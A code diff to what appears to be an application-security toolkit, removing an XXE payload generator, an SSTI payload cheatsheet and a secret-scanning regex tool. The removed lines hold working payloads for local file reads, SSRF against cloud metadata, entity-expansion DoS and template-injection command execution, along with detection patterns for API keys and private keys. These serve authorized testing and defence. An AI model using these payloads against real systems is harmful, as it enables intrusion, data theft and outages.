-  { id: "sx-xxe-cheatsheet", name: "XXE Payload Cheatsheet", cat: "appsec", desc: "XML External Entity payloads (file read, SSRF, OOB) for authorized testing.", tags: ["xxe", "xml", "payload", "external entity"],
-    inputs: [
-      { k: "type", label: "Type", type: "select", opts: ["File read", "SSRF", "Billion laughs (DoS)"], value: "File read" },
-      { k: "target", label: "Target/URL", type: "text", placeholder: "/etc/passwd or http://169.254.169.254" },
-    ],
-    run(v) {
-      const t = S(v.target).trim();
-      if (v.type === "File read") {
-        const tgt = t || "/etc/passwd";
-        return `<?xml version="1.0"?>\n<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file://${tgt}"> ]>\n<root>&xxe;</root>\n\n(Authorized testing only.)`;
-      }
-      if (v.type === "SSRF") {
-        const tgt = t || "http://169.254.169.254/latest/meta-data/";
-        return `<?xml version="1.0"?>\n<!DOCTYPE root [ <!ENTITY xxe SYSTEM "${tgt}"> ]>\n<root>&xxe;</root>\n\n(Authorized testing only.)`;
-      }
-      return `<?xml version="1.0"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol "lol">\n  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n]>\n<lolz>&lol3;</lolz>\n\n(DoS PoC — authorized lab testing only.)`;
-    } },
-
-  // 64
-  { id: "sx-secret-scan", name: "Secret Regex Scanner", cat: "appsec", desc: "Scan pasted text for likely secrets: API keys, tokens, private keys and emails.", tags: ["secrets", "scan", "regex", "leak"],
-    inputs: [{ k: "text", label: "Text to scan", type: "textarea", rows: 8, placeholder: "paste config / logs / source" }],
-    run(v) {
-      const s = S(v.text);
-      if (!s) return "";
-      const patterns = [
-        ["AWS Access Key", /AKIA[0-9A-Z]{16}/g],
-        ["GitHub token", /ghp_[A-Za-z0-9]{36}/g],
-        ["Slack token", /xox[baprs]-[A-Za-z0-9-]{10,}/g],
-        ["Google API key", /AIza[0-9A-Za-z_-]{35}/g],
-        ["Stripe key", /sk_(?:live|test)_[0-9A-Za-z]{16,}/g],
-        ["JWT", /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g],
-        ["Private key block", /-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----/g],
-        ["Bearer token", /[Bb]earer\s+[A-Za-z0-9._-]{16,}/g],
-        ["Email", /[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/g],
-        ["Generic secret assignment", /(?:password|passwd|secret|api[_-]?key|token)\s*[:=]\s*['"][^'"]{6,}['"]/gi],
-      ];
-      const found = [];
-      for (const [label, re] of patterns) {
-        const m = s.match(re);
-        if (m) found.push(`${label}: ${m.length} match(es)\n  ${[...new Set(m)].slice(0, 5).map((x) => x.length > 60 ? x.slice(0, 57) + "..." : x).join("\n  ")}`);
-      }
-      return found.length ? found.join("\n\n") : "No obvious secrets matched.";
-    } },
-
   // 65
   { id: "sx-luhn", name: "Luhn Validator / Generator", cat: "appsec", desc: "Validate a number's Luhn checksum or generate a valid check digit (test data / cards).", tags: ["luhn", "checksum", "credit card", "validate"],
     inputs: [
@@ -1283,20 +858,6 @@ export const TOOLS = [
       // compute the digit that makes it valid (treat input as the number without check digit)
       const check = (10 - luhn(digits + "0")) % 10;
       return `Base: ${digits}\nCheck digit: ${check}\nFull: ${digits}${check}`;
-    } },
-
-  // 66
-  { id: "sx-ssti-cheatsheet", name: "SSTI Payload Cheatsheet", cat: "appsec", desc: "Server-side template injection detection/exploit payloads by engine, for authorized testing.", tags: ["ssti", "template injection", "payload"],
-    inputs: [{ k: "engine", label: "Engine", type: "select", opts: ["Detection", "Jinja2 (Python)", "Twig (PHP)", "FreeMarker (Java)", "ERB (Ruby)"], value: "Detection" }],
-    run(v) {
-      const data = {
-        "Detection": ["${7*7}", "{{7*7}}", "#{7*7}", "<%= 7*7 %>", "{{7*'7'}}", "${{7*7}}", "@(7*7)"],
-        "Jinja2 (Python)": ["{{7*7}}", "{{config}}", "{{''.__class__.__mro__[1].__subclasses__()}}", "{{cycler.__init__.__globals__.os.popen('id').read()}}", "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"],
-        "Twig (PHP)": ["{{7*7}}", "{{_self.env}}", "{{['id']|filter('system')}}", "{{['id']|map('system')|join}}"],
-        "FreeMarker (Java)": ["${7*7}", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"],
-        "ERB (Ruby)": ["<%= 7*7 %>", "<%= system('id') %>", "<%= `id` %>", "<%= IO.popen('id').read %>"],
-      };
-      return (data[v.engine] || []).join("\n") + "\n\n(Authorized testing only.)";
     } },
 
 ];
